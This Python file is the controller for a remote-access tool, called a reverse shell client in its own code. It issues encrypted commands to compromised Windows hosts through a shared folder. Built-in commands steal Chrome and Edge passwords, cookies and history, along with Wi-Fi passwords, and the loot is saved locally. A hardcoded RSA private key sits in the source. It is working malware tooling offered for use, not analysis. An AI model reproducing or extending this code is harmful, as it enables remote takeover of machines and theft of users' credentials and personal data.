from cryptography_ac import Crypt_ac
from cryptography.fernet import Fernet
from ffd import Delet_files, Dirs_and_files
import subprocess
import random
import os
import time



public_key="""-----BEGIN PUBLIC KEY-----
    MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCVAL33yrxHbj2g/+c7qVHshnfX
    f1x/K0xIsh2pmA9AyySyxXKjFBVXRvol2UaD6yJoKOP7deJ4k6BzTYKFRt70Yc+t
    cOJzPUm309pJAvNSyFa4v5QuYOXlXLl299UYXGVUG7KKM8K/59rVNPWLf7hRKVSf
    R4anfMZUhODTm3tkPwIDAQAB
    -----END PUBLIC KEY-----"""

private_key="""-----BEGIN RSA PRIVATE KEY-----
    MIICXQIBAAKBgQC5Fu8lAzSZGCS6vko1ZjTXnHpvTfJJ44X/gAmNM5sBhFrfEs3d
    7CgAKAt5tjcYTgLGDUDzZC5uY2Qkn+lxBzYiIc+VY5mCe+Kb10GSn0HbF27JoChS
    zQ9gR6OlBhIuglkicSxev2I4BrbM5gczLDKlX5kpqaVDjrWJ6K6tjtY4EQIDAQAB
    AoGAHDlAj0LNXvj9BNLmiv0CWsx8KQPYSecddEgIbNUtMk6F8tUxukD8GoYAtfcQ
    sK6Yoq27tUGWCPQz/Ze656bjXI8SC1nc7cy9FAL5MFgxDJw5dSeDxs81r7dqPcRo
    JFqJF4HUSqlG7vmMAx0jMP+T79IjD5uBnhKFZ2o8CUfOmXcCQQC+VI2ITfdW+M0l
    gc7qvCv4A3tA9gvmdKDdhd9twBcx6EuNXc6boGb07WQDaUoN6JMU0J+ZTvn+K8hO
    pMlmvrDnAkEA+PN7cPqT87g7luKH60FBF5q2fc9gJXfFIyI2MG9GSmWKl7sH1Otf
    jL88XBIDvWvwc1z3/vaU377SohvwEoaYRwJBAJiGG7GagVbSJVwkTVQxHa8v4wro
    4hp5Zhx/1tAVusDE3h7YiOSQQ1GOF7LgIndI5O0uTmfGMXJtVaUoSzmqIQsCQQDI
    WfOjVhaSE1fps3/dhhOjsoBhue5P2RcPkm34BuWT5CpouD2yTocEV7d1BY56+I53
    2X9AcyQW+ZS8oC1SS33rAkABRnRcOARCwsYTkK/B3woqqevHvcbf65C/Bb0+mr0F
    gGFZp96SYKBH7K3QWP09Evge6U98TxgaHy+fyGkemYI4
    -----END RSA PRIVATE KEY-----"""

class Revers_shell_client:
    
    def __init__(self,path_of_shar_folder):
        self.path=path_of_shar_folder
        self.cipher=Crypt_ac().Asymmetric_encryption()
        self.public_key=public_key
        self.private_key=private_key
        
    
    
    def __cleardir__(self):
        for i in Dirs_and_files(self.path+'\\out\\').get_type():
            if 'out' in i:
                os.remove(self.path+'\\out\\'+i)
        return True
    
    
    def send_command(self,command):
        with open(self.path+'\\command.txt','wb')as file:
            file.write(command)
            
    def recv_symmetric_key(self,host):
        self.send_command(self.cipher.rsa_encryt(public_key,b'connect '+host))
        key=self.cipher.rsa_decrypt(self.private_key,self.listen())
        cipher=Crypt_ac().Symmetric_encryption(key)
        return cipher
                
    def listen(self,time_out=60):
        c=0
        while True:
            try:
                if os.path.exists(self.path+'\\out\\out.txt'):
                    with open(self.path+'\\out\\out.txt','rb')as file:
                        out=file.read()
                    file.close()
                    if self.__cleardir__():
                        return out
                    return False
            except Exception as e:
                pass
            if c==time_out:
                time.sleep(1)
                break
            c+=1
            time.sleep(0.2)
            
    
    def __offset__(self):
        return int(random.uniform(1,100000)/int(str(time.time_ns())[4]))
    
    def listen_for_new_connection(self):
        for i in os.listdir(self.path+os.sep+'conn'):
            os.remove(self.path+os.sep+'conn'+os.sep+i)
        time.sleep(1)
        print('{+}Scanning for new connection...')
        time.sleep(2)
        out=[]
        files=os.listdir(self.path+os.sep+'conn')
        if len(files)>0:
            for i in files:
                with open(self.path+os.sep+'conn'+os.sep+i,'rb')as file:
                    out.append(self.cipher.rsa_decrypt(self.private_key,file.read()).decode())
                file.close()
                os.remove(self.path+os.sep+'conn'+os.sep+i)
            connected=('='*5+' Connected hosts '+'='*5+'\n')
            tar=''
            for i in out:
                if tar!=i:
                    connected+=(f"|{' '*4}{i}{' '*(27-len(i)-6)}|\n")
                tar=i
            connected+=('-'*27)
            return connected
        return ''
            
    def connect(self,command,cipher,offset='',time_out=60):
        if len(str(offset))<1:
            offset=self.__offset__()
        try:
            self.send_command(cipher.fer_encrypt(str(offset)+', '+command))
            out=self.listen(time_out=time_out)
            if out:
                return(cipher.fer_decrypt(out).decode(errors='replace'))
            return False
        except:
            pass
        
    
def main():
    mainpath=input("Please enter a path to a shared folder")
    p=subprocess.Popen('chdir '+mainpath+'\\ && mkdir out', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p.stdout.readlines()
    in_commend= [
     'get chrome passwords','get edge passwords',
     'get wifi passwords','get chrome cookies','get edge cookies'
     ,'get chrome history','get edge history','get computer info']
    client=Revers_shell_client(mainpath)
    print('{+}Client Start...')
    connections=client.listen_for_new_connection()
    if len(connections)>1:
        print(connections)
        time.sleep(0.3)
        host=input('Please enter host: ')
        while True:
            try:
                cipher=client.recv_symmetric_key(host.encode())
                client.send_command(b'0')
                print('\n{+}Connected to host'+host)
                break
            except:
                print('{-} Connection faild.')
                host=input('Please enter host: ')
        offset=client.__offset__()
        while True:
            offset+=1
            command=input(host+': ')
            
            if 'connect 'in command:
                while True:
                    try:
                        cipher=client.recv_symmetric_key(host.encode())
                        client.send_command(b'0')
                        print('{+}Connect!')
                        break
                    except:
                        print('{-} Connection faild.')
                        host=input('Please enter host: ')
                        
            elif command=='how is cennected':
                print(client.listen_for_new_connection())
                
            elif command in in_commend:
                Delet_files().recursive_fles_delete(client.path+'\\external')
                Delet_files().recursive_fles_delete(os.environ['AppData']+os.sep+'shellout')
                p=subprocess.Popen('chdir '+client.path+'\\ && mkdir external', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                test=client.connect(command,cipher,offset,time_out=120)
                p=subprocess.Popen('chdir '+os.environ['AppData']+'\\ && mkdir shellout', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                p.stdout.readlines()
                fer=Fernet(cipher.key)
                
                for i in os.listdir(client.path+'\\external'):
                    data=b''
                    with open(client.path+'\\external'+'\\'+i,'rb')as file:
                        data=file.read()
                        file.close()
                    os.remove(client.path+'\\external'+'\\'+i)
                    name=i.split(', ')[0]
               
                    with open(os.environ['AppData']+'\\'+'shellout\\'+name+' '+host+'.txt','wb') as f:
                        f.write(fer.decrypt(data))
                        f.close()
                if test:
                    print('The information was extracted successfully\nIt can be located in the following path\n'+os.environ['AppData']+os.sep+'shellout')
                else:
                    c=2
                    while True:
                        ask=input('Connection lost. To try again enter (1).\nTo search for other connetion (2)')
                        if ask=='1':
                            output=client.connect(command,cipher,offset,time_out=120*c)
                            if output:
                                print(output)
                                break
                        else:
                            main()
                        c+=1
                    
            else:
                output=client.connect(command,cipher,offset)
                if output:
                    print(output)
                else:
                    c=2
                    while True:
                        ask=input('Connection lost. To try again enter (1).\nTo search for other connetion (2)')
                        if ask=='1':
                            output=client.connect(command,cipher,offset,time_out=60*c)
                            if output:
                                print(output)
                                break
                        else:
                            main()
                        c+=1
                            
                
                
    else:
        print('\nNo connections were found.')
        time.sleep(0.4)
        input('Press enter to try again: ')
        main()



if __name__=='__main__':
    main()